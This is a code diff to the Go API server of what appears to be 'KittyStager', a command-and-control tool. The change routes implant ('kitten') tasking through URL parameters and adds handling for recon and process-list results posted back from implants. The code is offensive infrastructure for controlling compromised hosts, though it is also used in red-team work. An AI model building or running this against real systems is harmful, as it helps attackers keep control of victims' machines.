@@ -3,8 +3,9 @@ package api
 import (
 	"KittyStager/internal/config"
 	"KittyStager/internal/kitten"
-	"KittyStager/internal/recon"
 	"KittyStager/internal/task"
+	ps2 "KittyStager/internal/task/ps"
+	"KittyStager/internal/task/recon"
 	"KittyStager/pkg/crypto"
 	"fmt"
 	"github.com/gin-gonic/gin"
@@ -52,8 +53,8 @@ func Api(config *config.Config) error {
 	front.Use(gin.Recovery())
 	//gin.SetMode(gin.ReleaseMode)
 	//front := gin.Default()
-	front.GET(conf.GetGetEndpoint(), frontGetTaskByName)
-	front.POST(conf.GetPostEndpoint(), frontPostRecon)
+	front.GET(fmt.Sprintf("%s/:name", conf.GetGetEndpoint()), frontGetTask)
+	front.POST(fmt.Sprintf("%s/:name", conf.GetPostEndpoint()), frontPostTask)
 	front.POST(conf.GetOpaqueEndpoint(), frontPostReg)
 	addr := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
 
@@ -63,8 +64,9 @@ func Api(config *config.Config) error {
 	back.GET("kittensList", backGetKittensList)
 	back.GET("conf", backGetConf)
 	back.GET("logs", backGetLogs)
-	back.GET("task/:name", backGetKittenTasks)
-	back.POST("task/:name", backCreateTaskByName)
+	back.GET("task/:name", backGetTasks)
+	back.GET("result/:name", backGetResult)
+	back.POST("task/:name", backCreateTask)
 	//frontend
 	g.Go(func() error {
 		fmt.Printf("[*] Listening on %s\n", addr)
@@ -85,8 +87,8 @@ func Api(config *config.Config) error {
 // ------------------------
 // frontend
 // ------------------------
-func frontGetTaskByName(c *gin.Context) {
-	name := c.GetHeader("Cookie")
+func frontGetTask(c *gin.Context) {
+	name := c.Param("name")
 	tasks := Kittens[name].Tasks
 	//take the last task
 	var t *task.Task
@@ -116,9 +118,9 @@ func frontGetTaskByName(c *gin.Context) {
 	Kittens[name].SetLastSeen(lastSeen)
 }
 
-func frontPostRecon(c *gin.Context) {
-	name := c.GetHeader("Cookie")
-	r := recon.NewRecon("", "", "", "", "", "", 0)
+func frontPostTask(c *gin.Context) {
+	name := c.Param("name")
+	t := task.NewTask("", nil)
 	data, err := io.ReadAll(c.Request.Body)
 	if err != nil {
 		return
@@ -127,11 +129,25 @@ func frontPostRecon(c *gin.Context) {
 	if err != nil {
 		return
 	}
-	err = r.UnmarshallTask(d)
+	err = t.UnmarshallTask(d)
 	if err != nil {
 		return
 	}
-	Kittens[name].SetRecon(r)
+	switch t.Tag {
+	case "recon":
+		r := recon.NewRecon("", "", "", "", "", "", 0)
+		err = r.UnmarshallTask(t.Payload)
+		if err != nil {
+			return
+		}
+		Kittens[name].SetRecon(r)
+	case "ps":
+		ps := ps2.NewProcessList(nil)
+		err = ps.UnmarshallTask(t.Payload)
+		if err != nil {
+			return
+		}
+	}
 }
 
 func frontPostReg(c *gin.Context) {
@@ -183,13 +199,13 @@ func backGetLogs(c *gin.Context) {
 	}
 }
 
-func backGetKittenTasks(c *gin.Context) {
+func backGetTasks(c *gin.Context) {
 	name := c.Param("name")
 	t := Kittens[name].Tasks
 	c.IndentedJSON(200, t)
 }
 
-func backCreateTaskByName(c *gin.Context) {
+func backCreateTask(c *gin.Context) {
 	name := c.Param("name")
 	var t task.Task
 	var b []byte
@@ -206,4 +222,10 @@ func backCreateTaskByName(c *gin.Context) {
 		conf.SetSleep(t)
 	}
 	Kittens[name].SetTask(&t)
+}
+
+func backGetResult(c *gin.Context) {
+	name := c.Param("name")
+	t := Kittens[name].Tasks
+	c.IndentedJSON(200, t)
 }
